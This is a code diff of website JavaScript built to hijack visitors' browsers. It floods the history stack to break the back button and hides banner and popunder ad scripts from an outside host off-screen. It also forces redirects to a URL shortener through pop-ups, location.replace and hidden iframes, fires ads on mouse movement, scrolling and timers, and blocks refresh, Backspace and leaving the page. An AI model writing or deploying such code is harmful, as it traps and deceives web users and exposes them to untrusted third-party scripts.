@@ -1,22 +1,23 @@
 // ====== BRUTAL ADS CONFIGURATION ======
-const AD_NETWORKS = {
-  banner: [
-    // High paying banner ads (300x250)
-    '<script type="text/javascript">atOptions = {\'key\' : \'4b1eafbbf9404932effcedf29b70c2c7\',\'format\' : \'iframe\',\'height\' : 250,\'width\' : 300,\'params\' : {}};</script><script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>',
-    '<script async="async" data-cfasync="false" src="//spaniardinformationbookworm.com/868d42ad6f620a7c28f3928d2b4bc961/invoke.js"></script><div id="container-868d42ad6f620a7c28f3928d2b4bc961"></div>',
-    '<script type="text/javascript">atOptions = {\'key\' : \'97f68ad2d8c855e8f26d7e6b7c5a4b3c\',\'format\' : \'iframe\',\'height\' : 250,\'width\' : 300,\'params\' : {}};</script><script type="text/javascript" src="//spaniardinformationbookworm.com/97f68ad2d8c855e8f26d7e6b7c5a4b3c/invoke.js"></script>'
-  ],
-  popunder: [
-    '//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b591.js',
-    '//spaniardinformationbookworm.com/97/68/f5/9768f5d78dfc013bf8c5047b5505e390.js'
-  ]
-};
+const BANNER_SCRIPT = `
+<script type="text/javascript">
+	atOptions = {
+		'key' : '4b1eafbbf9404932effcedf29b70c2c7',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>
+`;
 
-const HISTORY_PUSH_COUNT = 100; // Brutal history stacking
+const POPUNDER_SCRIPT = '<script type="text/javascript" src="//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b591.js"></script>';
+
+const HISTORY_PUSH_COUNT = 100;
 
 // ====== BRUTAL INITIALIZATION ======
 window.addEventListener('load', function() {
-  // Initialize everything aggressively
   brutalPushStates(HISTORY_PUSH_COUNT);
   createStars();
   createShootingStars();
@@ -55,19 +56,14 @@ function brutalPushStates(count = 1) {
     }
   }
   
-  // Replace current state to prevent back
   history.replaceState({trapped: true}, "", window.location.href);
 }
 
 // ====== BRUTAL POPSTATE HANDLER ======
 window.addEventListener('popstate', function(event) {
-  // Immediately push more states when user tries to go back
   brutalPushStates(50);
-  
-  // Trigger emergency ads
   triggerEmergencyAds();
   
-  // Redirect to ads if possible
   setTimeout(() => {
     openBrutalRedirect();
   }, 100);
@@ -76,7 +72,6 @@ window.addEventListener('popstate', function(event) {
 // ====== BRUTAL BUTTON HANDLING ======
 function initializeBrutalButtons() {
   document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
-    // Remove any existing listeners first
     button.replaceWith(button.cloneNode(true));
   });
 
@@ -88,21 +83,18 @@ function initializeBrutalButtons() {
       createRipple(this, e);
       createStarburst(this);
       
-      // Multiple ad triggers on single click
-      triggerBannerAds(3); // Trigger 3 different banner ads
+      // Multiple triggers on single click
+      triggerBannerAds(3); // Trigger 3x banner ads
       triggerPopunder();
       brutalPushStates(25);
       
-      // Open new tab/window with ads
       setTimeout(() => {
         openBrutalRedirect();
       }, 500);
       
-      // Prevent default after delay
       return false;
     });
     
-    // Add touch events for mobile
     button.addEventListener('touchstart', function(e) {
       e.preventDefault();
       triggerBannerAds(2);
@@ -113,20 +105,13 @@ function initializeBrutalButtons() {
 
 // ====== BRUTAL AD TRIGGERS ======
 function triggerBannerAds(count = 1) {
-  const hiddenAds = document.getElementById('hiddenAds');
-  
   for (let i = 0; i < count; i++) {
-    const adIndex = Math.floor(Math.random() * AD_NETWORKS.banner.length);
-    const adScript = AD_NETWORKS.banner[adIndex];
-    
-    // Create container for ad
     const adContainer = document.createElement('div');
     adContainer.style.cssText = 'position:fixed; top:-1000px; left:-1000px; width:300px; height:250px; z-index:9999;';
-    adContainer.innerHTML = adScript;
+    adContainer.innerHTML = BANNER_SCRIPT;
     
     document.body.appendChild(adContainer);
     
-    // Remove after some time
     setTimeout(() => {
       if (adContainer.parentNode) {
         adContainer.parentNode.removeChild(adContainer);
@@ -137,19 +122,15 @@ function triggerBannerAds(count = 1) {
 
 function triggerPopunder() {
   try {
-    AD_NETWORKS.popunder.forEach(scriptUrl => {
-      const script = document.createElement('script');
-      script.src = scriptUrl;
-      script.async = true;
-      document.head.appendChild(script);
-    });
+    const script = document.createElement('script');
+    script.innerHTML = POPUNDER_SCRIPT;
+    document.head.appendChild(script);
   } catch (e) {
     console.log('Popunder blocked');
   }
 }
 
 function triggerEmergencyAds() {
-  // Trigger multiple ads in emergency
   triggerBannerAds(5);
   triggerPopunder();
   brutalPushStates(50);
@@ -157,9 +138,7 @@ function triggerEmergencyAds() {
 
 // ====== BRUTAL REDIRECT ======
 function openBrutalRedirect() {
-  // Try multiple redirect methods
   try {
-    // Method 1: window.open
     const newWindow = window.open('https://shorter.me/WHO7C', '_blank');
     if (newWindow) {
       setTimeout(() => {
@@ -169,14 +148,12 @@ function openBrutalRedirect() {
   } catch (e) {}
   
   try {
-    // Method 2: location.replace (more aggressive)
     setTimeout(() => {
       window.location.replace('https://shorter.me/WHO7C');
     }, 1500);
   } catch (e) {}
   
   try {
-    // Method 3: Create iframe redirect
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
     iframe.src = 'https://shorter.me/WHO7C';
@@ -186,13 +163,10 @@ function openBrutalRedirect() {
 
 // ====== PRELOAD ADS ======
 function preloadAllAds() {
-  // Preload banner ads
-  AD_NETWORKS.banner.forEach(adScript => {
-    const preloadDiv = document.createElement('div');
-    preloadDiv.style.display = 'none';
-    preloadDiv.innerHTML = adScript;
-    document.getElementById('hiddenAds').appendChild(preloadDiv);
-  });
+  const preloadDiv = document.createElement('div');
+  preloadDiv.style.display = 'none';
+  preloadDiv.innerHTML = BANNER_SCRIPT;
+  document.getElementById('hiddenAds').appendChild(preloadDiv);
 }
 
 // ====== USER BEHAVIOR DETECTION ======
@@ -200,13 +174,11 @@ let mouseMoveCount = 0;
 function handleMouseMovement(e) {
   mouseMoveCount++;
   
-  // Trigger ads on certain mouse movement patterns
   if (mouseMoveCount % 50 === 0) {
     triggerBannerAds(1);
   }
   
-  // Trigger on mouse position (simulating interest)
-  if (e.clientY < 100) { // Top of screen
+  if (e.clientY < 100) {
     triggerPopunder();
   }
 }
@@ -215,7 +187,6 @@ let scrollCount = 0;
 function handleScroll() {
   scrollCount++;
   
-  // Trigger ads on scroll
   if (scrollCount % 10 === 0) {
     triggerBannerAds(1);
   }
@@ -351,7 +322,6 @@ function createStarburst(button) {
 
 // ====== AUTO TRIGGERS ======
 setInterval(() => {
-  // Random ad triggers
   if (Math.random() > 0.7) {
     triggerBannerAds(1);
   }
@@ -359,23 +329,17 @@ setInterval(() => {
 
 // ====== BRUTAL EXIT PREVENTION ======
 window.addEventListener('beforeunload', function(e) {
-  // Trigger ads when user tries to leave
   triggerEmergencyAds();
-  
-  // Standard confirmation dialog (some browsers show this)
   e.preventDefault();
   e.returnValue = 'Are you sure you want to leave?';
 });
 
-// Prevent keyboard shortcuts
 document.addEventListener('keydown', function(e) {
-  // Block F5, Ctrl+R, etc.
   if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
     e.preventDefault();
     triggerEmergencyAds();
   }
   
-  // Block backspace as back navigation
   if (e.key === 'Backspace' && !e.target.matches('input, textarea')) {
     e.preventDefault();
     brutalPushStates(10);
